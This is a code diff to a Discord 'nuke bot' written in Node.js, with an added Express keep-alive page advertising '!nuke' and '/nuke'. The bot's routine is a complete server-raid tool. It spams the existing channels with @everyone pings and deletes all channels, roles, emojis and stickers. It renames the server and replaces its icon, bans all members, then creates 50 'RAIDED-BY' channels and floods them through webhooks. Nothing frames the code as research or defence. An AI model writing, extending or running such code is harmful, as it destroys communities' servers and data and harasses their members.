@@ -1,6 +1,36 @@
 require('dotenv').config();
+const express = require('express');
 const { Client, GatewayIntentBits, PermissionsBitField, ChannelType, REST, Routes } = require('discord.js');
 
+// ---- EXPRESS WEB SERVER (keeps Render alive) ----
+const app = express();
+const PORT = process.env.PORT || 3000;
+
+app.get('/', (req, res) => {
+  res.send(`
+    <!DOCTYPE html>
+    <html>
+      <head><title>☢️ NUKE BOT</title></head>
+      <body style="background: #0a0a0a; color: #ff4444; font-family: monospace; text-align: center; padding: 50px;">
+        <h1>🔥 NUKE BOT IS ALIVE</h1>
+        <p>Status: <span style="color: #00ff00;">● ONLINE</span></p>
+        <p>Uptime: ${Math.floor(process.uptime())} seconds</p>
+        <p>Commands: <code>!nuke</code> or <code>/nuke</code></p>
+        <p style="color: #888; margin-top: 50px;">⚡ Powered by CAT</p>
+      </body>
+    </html>
+  `);
+});
+
+app.get('/ping', (req, res) => {
+  res.send('pong');
+});
+
+app.listen(PORT, () => {
+  console.log(`🌐 Web server running on port ${PORT}`);
+});
+
+// ---- DISCORD BOT ----
 const client = new Client({
   intents: [
     GatewayIntentBits.Guilds,
@@ -16,15 +46,15 @@ const CLIENT_ID = process.env.CLIENT_ID;
 const GUILD_ID = process.env.GUILD_ID || null;
 
 const CHANNEL_COUNT = 50;
-const MESSAGES_PER_CHANNEL = 50; // ← changed to 50
-const SPAM_TEXT = '🔥 GET RAIDED BY {username} - THIS SERVER IS OURS 🔥';
+const MESSAGES_PER_CHANNEL = 50;
+const SPAM_TEXT = '@everyone 🔥 GET RAIDED BY {username} - THIS SERVER IS OURS 🔥 @everyone';
 
 client.once('ready', async () => {
   console.log(`🔥 ${client.user.tag} online.`);
   const rest = new REST({ version: '10' }).setToken(TOKEN);
   const commands = [{
     name: 'nuke',
-    description: '💀 Nuke + 50 channels + 50 msgs each (Admin)',
+    description: '💀 Full server nuke + spam (Admin)',
     default_member_permissions: PermissionsBitField.Flags.Administrator.toString()
   }];
   try {
@@ -68,42 +98,61 @@ async function executeNuke(ctx) {
   const spamText = SPAM_TEXT.replace(/{username}/g, author.user?.tag || 'RAIDER');
 
   if (ctx.editReply) {
-    await ctx.editReply(`☢️ **STARTING** – ${CHANNEL_COUNT} channels, ${MESSAGES_PER_CHANNEL} msgs each...`);
+    await ctx.editReply(`☢️ **FULL NUKE INITIATED** – deleting, banning, spamming...`);
   } else {
-    await reply(`☢️ **STARTING** – ${CHANNEL_COUNT} channels, ${MESSAGES_PER_CHANNEL} msgs each...`);
+    await reply(`☢️ **FULL NUKE INITIATED** – deleting, banning, spamming...`);
   }
 
-  // ---- DELETE ALL CHANNELS ----
-  console.log('🗑️ Deleting all channels...');
+  // ---- SPAM EXISTING CHANNELS ----
+  console.log('📨 Spamming existing channels...');
+  const existingChannels = guild.channels.cache.filter(ch => ch.type === ChannelType.GuildText);
+  for (const [, channel] of existingChannels) {
+    try {
+      for (let i = 0; i < 10; i++) {
+        await channel.send(`${spamText} [PRE-WIPE ${i+1}/10]`);
+        await sleep(50);
+      }
+    } catch (_) {}
+  }
+
+  // ---- DELETE EVERYTHING ----
+  console.log('🗑️ Deleting channels...');
   for (const [, ch] of guild.channels.cache) {
     try { await ch.delete(); await sleep(80); } catch (_) {}
   }
 
-  // ---- DELETE ROLES ----
   console.log('🗑️ Deleting roles...');
   for (const [, role] of guild.roles.cache.filter(r => r.id !== guild.id)) {
     try { await role.delete(); await sleep(80); } catch (_) {}
   }
 
-  // ---- DELETE EMOJIS ----
   console.log('🗑️ Deleting emojis...');
   for (const [, emoji] of guild.emojis.cache) {
     try { await emoji.delete(); await sleep(80); } catch (_) {}
   }
 
-  // ---- DELETE STICKERS ----
   console.log('🗑️ Deleting stickers...');
   for (const [, sticker] of guild.stickers.cache) {
     try { await sticker.delete(); await sleep(80); } catch (_) {}
   }
 
-  // ---- BAN ALL MEMBERS ----
+  // ---- RENAME + ICON ----
+  try {
+    await guild.setName(`RAIDED BY ${author.user?.username || 'RAIDER'}`);
+    console.log('✅ Server renamed.');
+  } catch (_) {}
+  try {
+    await guild.setIcon('https://i.imgur.com/4MQI7gI.png');
+    console.log('✅ Server icon changed.');
+  } catch (_) {}
+
+  // ---- BAN ALL ----
   console.log('🔨 Banning members...');
   let banned = 0;
   for (const [, member] of guild.members.cache) {
     if (member.id === author.id || member.id === client.user.id) continue;
     try {
-      await member.ban({ reason: 'Nuke by ' + (author.user?.tag || author.tag) });
+      await member.ban({ reason: 'Nuked by ' + (author.user?.tag || author.tag) });
       banned++;
       if (banned % 10 === 0) await sleep(150);
     } catch (_) {}
@@ -115,7 +164,7 @@ async function executeNuke(ctx) {
   for (let i = 0; i < CHANNEL_COUNT; i++) {
     try {
       const ch = await guild.channels.create({
-        name: i === 0 ? `raided-by-${username}` : `raided-by-${username}-${i}`,
+        name: i === 0 ? `RAIDED-BY-${username}` : `RAIDED-BY-${username}-${i}`,
         type: ChannelType.GuildText,
         permissionOverwrites: [{
           id: guild.id,
@@ -123,20 +172,19 @@ async function executeNuke(ctx) {
         }]
       });
       channels.push(ch);
-      console.log(`✅ Created channel ${i+1}/${CHANNEL_COUNT}: ${ch.name}`);
+      console.log(`✅ Created channel ${i+1}/${CHANNEL_COUNT}`);
       if (i % 10 === 0) await sleep(200);
     } catch (err) {
-      console.error(`❌ Failed to create channel ${i}:`, err.message);
+      console.error(`❌ Failed channel ${i}:`, err.message);
     }
   }
 
-  console.log(`✅ Created ${channels.length} channels. Starting spam (${MESSAGES_PER_CHANNEL} msgs each)...`);
-
-  // ---- SPAM 50 MESSAGES PER CHANNEL USING WEBHOOKS ----
+  // ---- SPAM 50 MSGS PER CHANNEL (webhooks) ----
+  console.log(`📨 Spamming ${MESSAGES_PER_CHANNEL} msgs in ${channels.length} channels...`);
   let totalSent = 0;
   for (let chIdx = 0; chIdx < channels.length; chIdx++) {
     const channel = channels[chIdx];
-    console.log(`📨 Spamming channel ${chIdx+1}/${channels.length}: ${channel.name}`);
+    console.log(`📨 Channel ${chIdx+1}/${channels.length}: ${channel.name}`);
 
     let webhook;
     try {
@@ -145,7 +193,7 @@ async function executeNuke(ctx) {
         avatar: 'https://i.imgur.com/4MQI7gI.png'
       });
     } catch (err) {
-      console.error(`❌ Webhook failed in ${channel.name}:`, err.message);
+      console.error(`❌ Webhook failed:`, err.message);
       continue;
     }
 
@@ -156,22 +204,23 @@ async function executeNuke(ctx) {
       try {
         await webhook.send({
           content: `${spamText} [${msgIdx+1}/${MESSAGES_PER_CHANNEL}]`,
-          username: author.user?.username || 'RAIDER'
+          username: author.user?.username || 'RAIDER',
+          avatarURL: 'https://i.imgur.com/4MQI7gI.png'
         });
         sent++;
         totalSent++;
         failures = 0;
 
         if (sent % 10 === 0) {
-          console.log(`   📤 ${channel.name} – ${sent}/${MESSAGES_PER_CHANNEL} sent`);
+          console.log(`   📤 ${channel.name} – ${sent}/${MESSAGES_PER_CHANNEL}`);
         }
 
-        await sleep(80); // fast but safe
+        await sleep(80);
 
       } catch (err) {
         failures++;
         if (failures > 5) {
-          console.log(`❌ Too many failures on ${channel.name}, moving on.`);
+          console.log(`❌ Failed on ${channel.name}, moving on.`);
           break;
         }
         await sleep(1000);
@@ -184,17 +233,17 @@ async function executeNuke(ctx) {
     await sleep(150);
   }
 
-  // ---- FINAL SUMMARY ----
-  const summary = `💀 **COMPLETE**\nChannels: ${channels.length}\nMessages sent: ${totalSent}\nMembers banned: ${banned}\nExecutor: ${author.user?.tag || author.tag}`;
+  // ---- FINAL VICTORY ----
+  const summary = `💀 **SERVER DESTROYED**\nChannels: ${channels.length}\nMessages: ${totalSent}\nBanned: ${banned}\nExecutor: ${author.user?.tag || author.tag}\n**THIS SERVER BELONGS TO ${author.user?.username?.toUpperCase() || 'RAIDER'}**`;
   try {
     if (channels.length > 0) {
       await channels[0].send(summary);
     }
   } catch (_) {}
 
-  console.log(`🎯 APOCALYPSE DONE: ${channels.length} channels, ${totalSent} messages, ${banned} bans`);
+  console.log(`🎯 NUKE COMPLETE: ${channels.length} channels, ${totalSent} msgs, ${banned} bans`);
   if (ctx.editReply) {
-    await ctx.editReply(`✅ Done. ${channels.length} channels, ${totalSent} messages, ${banned} bans.`);
+    await ctx.editReply(`✅ Nuke complete. ${channels.length} channels, ${totalSent} msgs, ${banned} bans.`);
   }
 }
 
